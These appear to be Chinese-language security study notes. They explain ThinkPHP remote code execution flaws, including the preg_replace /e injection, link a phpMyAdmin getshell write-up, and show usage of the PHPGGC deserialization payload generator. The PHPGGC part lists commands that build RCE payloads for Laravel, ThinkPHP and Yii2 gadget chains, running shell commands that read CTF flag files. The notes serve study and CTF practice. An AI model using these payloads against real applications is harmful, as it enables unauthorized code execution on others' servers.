


**thinkphp rce漏洞**：比如5.0版本有个rce漏洞，该漏洞的漏洞关键点存在于thinkphp/library/think/Request.php文件中
在docker中复现了多种版本的rce漏洞。

**漏洞的原理有了解吗,攻击后的返回包的有分析过吗?**
THINKPHP RCE漏洞的原理：举例有一个RCE是这样的：Dispatcher.class.php中res参数中使用了preg_replace的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。

^
phpMyadmin漏洞：
<https://dummykitty.github.io/php/2020/11/22/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86.html#cve-2013-3238>


^
## **php框架反序列化利用工具PHPGGC**
>PHPGGC 是一个 unserialize（） 有效负载库，以及从命令行或编程方式生成它们的工具*。 当您在没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需经历查找小工具并组合它们的繁琐步骤。它可以被视为相当于[frohoff的ysoserial](https://github.com/frohoff/ysoserial)，但对于PHP。 目前，该工具支持小工具链，例如：CodeIgniter4，Doctrine，Drupal7，Guzzle，Laravel，Magento，Monolog，Phalcon，Podio，Slim，SwiftMailer，Symfony，Wordpress，Yii和ZendFramework，wordpress。

安装：
<https://www.cnblogs.com/xrzxyyds/p/the-introduction-and-installation-of-the-use-of-phpggc-s81yc.html>
```
克隆进入目录即可使用
https://github.com/ambionics/phpggc
```

使用：
```
./phpggc -l
列出全部

./phpggc -l Laravel

./phpggc -i Laravel/RCE2 
列出详情

./phpggc  Laravel/RCE2 system 'tac /fl*' |base64
生成序列化串

./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64`
./phpggc Yii2/RCE1 exec 'cp /fla* test.txt' --URL
```



